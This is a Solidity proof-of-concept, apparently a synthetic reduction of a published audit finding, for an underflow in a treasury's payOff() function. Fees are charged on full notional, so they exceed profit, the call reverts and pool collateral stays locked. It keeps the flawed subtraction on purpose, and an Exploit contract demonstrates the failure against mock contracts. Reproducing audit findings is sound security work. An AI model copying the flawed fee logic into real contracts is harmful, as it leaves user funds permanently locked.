// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Hyperhyper OperationalTreasury — payOff() underflow locks pool assets
    (Pashov Audit Group, Hyperhyper 2025-03-30, finding 57743 / H-06).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    payOff is the audited function. The blamed lines are copied verbatim (@> VULN).

    feesUSD = positionAmount * fee * currentPrice, on the full notional.
    pnl     = positionAmount * (currentPrice - strike).
    When the spot is only slightly above the strike, feesUSD exceeds pnl.
    In Solidity 0.8 the subtraction reverts, so the earlier
    exerciseOrLiquidatePosition is rolled back and the pool collateral stays locked.

    This position: amount 100, strike 100, spot 101, fee 2%.
    pnl = 100, feesUSD = 202. Collateral locked in the pool = 1,000. */

library DecimalsLib {
    function toDecimals(uint256 value, uint8, uint8) internal pure returns (uint256) {
        return value;
    }
}

interface IPositionInteraction {
    function exerciseOrLiquidatePosition(PositionClose calldata close) external;
}

struct PositionClose {
    uint256 positionID;
    uint256 pnl;
}

contract AssetToken {
    string public name = "Hyperhyper base";
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool is IPositionInteraction {
    AssetToken public token;
    mapping(uint256 => uint256) public lockedOf;
    mapping(uint256 => bool) public exercised;

    constructor(address _token) {
        token = AssetToken(_token);
    }

    function noteLock(uint256 positionID, uint256 amount) external {
        lockedOf[positionID] = amount;
    }

    function exerciseOrLiquidatePosition(PositionClose calldata close) external {
        exercised[close.positionID] = true;
        lockedOf[close.positionID] = 0;
        uint256 pnl = close.pnl;
        if (pnl > 0) token.transfer(msg.sender, pnl);
    }
}

contract OperationalTreasury {
    using DecimalsLib for uint256;

    uint256 internal constant BPS = 10_000;
    uint256 private _locked = 1;
    bool public paused;

    struct Position {
        address uAsset;
        uint256 amount;
        uint256 strike;
        uint256 price;
    }

    struct BaseSetUp {
        AssetToken token;
        address pool;
        uint256 protocolFees;
    }

    struct Ledger {
        mapping(address => uint256) collectedFees;
    }

    struct SetUp {
        BaseSetUp base;
    }

    struct Storage {
        SetUp setUp;
        Ledger ledger;
    }

    Storage internal strg;
    mapping(uint256 => Position) public positions;

    modifier nonReentrant() {
        require(_locked == 1, "reentrancy");
        _locked = 2;
        _;
        _locked = 1;
    }

    modifier whenNotPaused() {
        require(!paused, "paused");
        _;
    }

    constructor(address _token, address _pool) {
        strg.setUp.base.token = AssetToken(_token);
        strg.setUp.base.pool = _pool;
        strg.setUp.base.protocolFees = 200;
    }

    function seed(uint256 positionID, address uAsset, uint256 amount, uint256 strike, uint256 price) external {
        positions[positionID] = Position({uAsset: uAsset, amount: amount, strike: strike, price: price});
    }

    function collectedFees(address token) external view returns (uint256) {
        return strg.ledger.collectedFees[token];
    }

    function _pnl(Position memory pos) internal pure returns (uint256) {
        return (pos.amount * (pos.price - pos.strike)) / 1e18;
    }

    function _calculateFeesUSD(address, uint256 amount) internal view returns (uint256) {
        BaseSetUp memory baseSetUp = strg.setUp.base;
        uint256 price = positions[1].price;
        return (amount * baseSetUp.protocolFees * price) / (BPS * 1e18);
    }

    function preview(uint256 positionID) external view returns (uint256 pnl, uint256 feesUSD) {
        Position memory pos = positions[positionID];
        pnl = _pnl(pos);
        feesUSD = _calculateFeesUSD(pos.uAsset, pos.amount);
    }

    function payOff(uint256 positionID, address account) external nonReentrant whenNotPaused {
        Storage storage s = strg;
        BaseSetUp memory baseSetUp = s.setUp.base;
        Position memory pos = positions[positionID];
        address uAsset = pos.uAsset;
        uint256 amount = pos.amount;
        uint256 pnl = _pnl(pos);
        PositionClose memory close = PositionClose({positionID: positionID, pnl: pnl});

        IPositionInteraction(baseSetUp.pool).exerciseOrLiquidatePosition(close);

        uint256 feesUSD = _calculateFeesUSD(uAsset, uint256(amount)).toDecimals(18, baseSetUp.token.decimals());
        // @> VULN: feesUSD is taken on notional times price, not on pnl. feesUSD > pnl, so this checked subtraction reverts and rolls back the pool exercise. The collateral stays locked.
        uint256 netAmount = pnl - feesUSD;
        // FIX: if (feesUSD > pnl) feesUSD = pnl; so the position can close and the trader is paid the fair net.

        s.ledger.collectedFees[address(baseSetUp.token)] += feesUSD;
        if (pnl > 0) baseSetUp.token.transfer(account, netAmount);
    }
}

contract Exploit {
    uint256 public constant POSITION = 1;
    uint256 public constant LOCKED = 1000e18;
    uint256 public constant AMOUNT = 100e18;
    uint256 public constant STRIKE = 100e18;
    uint256 public constant PRICE = 101e18;
    address public constant HOLDER = 0x000000000000000000000000000000000000bEEF;
    address public constant UASSET = 0x0000000000000000000000000000000000000a55;

    AssetToken public token; // nonce 1
    Pool public pool; // nonce 2
    OperationalTreasury public treasury; // nonce 3

    uint256 public seenPnl;
    uint256 public seenFees;
    uint256 public lockedAssets;
    bool public payoffReverted;

    constructor() {
        token = new AssetToken();
        pool = new Pool(address(token));
        treasury = new OperationalTreasury(address(token), address(pool));
        treasury.seed(POSITION, UASSET, AMOUNT, STRIKE, PRICE);
    }

    function run() external {
        token.mint(address(pool), LOCKED);
        pool.noteLock(POSITION, LOCKED);
        uint256 posted = token.balanceOf(address(pool));
        require(posted == LOCKED, "collateral missing");
        require(pool.lockedOf(POSITION) == LOCKED, "lock not recorded");

        (uint256 pnl, uint256 feesUSD) = treasury.preview(POSITION);
        seenPnl = pnl;
        seenFees = feesUSD;
        require(pnl == 100e18, "pnl");
        require(feesUSD == 202e18, "fees");
        require(feesUSD > pnl, "fees do not exceed pnl");

        (bool ok,) = address(treasury).call(abi.encodeCall(OperationalTreasury.payOff, (POSITION, HOLDER)));
        payoffReverted = !ok;
        require(payoffReverted, "payOff did not revert");

        lockedAssets = token.balanceOf(address(pool));
        require(lockedAssets == LOCKED, "assets did not stay locked");
        require(pool.exercised(POSITION) == false, "exercise was not rolled back");
        require(pool.lockedOf(POSITION) == LOCKED, "position lock was released");
        require(token.balanceOf(HOLDER) == 0, "holder was paid");
        require(treasury.collectedFees(address(token)) == 0, "fees were collected");
    }
}
